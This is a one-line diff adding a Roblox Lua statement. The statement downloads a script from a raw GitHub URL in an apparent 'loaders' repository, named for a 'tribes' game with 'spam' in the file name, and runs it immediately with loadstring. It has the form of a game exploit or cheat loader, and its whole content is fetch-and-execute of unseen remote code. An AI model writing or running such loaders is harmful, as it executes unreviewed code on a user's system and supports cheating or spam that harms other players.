@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/tribes-3v3-1v1-added-spam3-qzwerb0volc3x6.lua"))()
